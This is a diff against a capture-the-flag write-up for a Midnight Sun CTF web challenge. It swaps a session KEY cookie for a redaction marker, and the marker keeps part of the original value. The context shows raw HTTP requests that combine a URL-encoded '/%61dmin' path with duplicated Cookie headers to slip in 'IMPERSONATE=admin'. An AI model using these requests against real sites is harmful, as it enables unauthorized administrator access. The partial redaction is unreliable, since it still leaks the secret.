@@ -137,7 +137,7 @@ Result:
 ```
 HTTP/1.0 200 OK
 Set-Cookie: IMPERSONATE=admin; Path=/
-Set-Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc; Path=/
+Set-Cookie: SECRET_REDACTED_BY_ANTIGRAVITYb442e0bc1135f08c143b22dc1efc; Path=/
 
 ```
 
@@ -150,7 +150,7 @@ We could split in two headers:
 ```
 GET /%61dmin HTTP/1.1
 Host: shithappens-01.play.midnightsunctf.se
-Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
+Cookie: SECRET_REDACTED_BY_ANTIGRAVITYb442e0bc1135f08c143b22dc1efc;
 Cookie: ;IMPERSONATE=
 
 ```
@@ -166,7 +166,7 @@ The solution was to add one of 3 symbols left: `=`,`%0c`,`%0b` , or one of 2 sym
 ```
 GET /%61dmin HTTP/1.1
 Host: shithappens-01.play.midnightsunctf.se
-Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
+Cookie: SECRET_REDACTED_BY_ANTIGRAVITYb442e0bc1135f08c143b22dc1efc;
 Cookie: ;=IMPERSONATE=admin
 
 ```
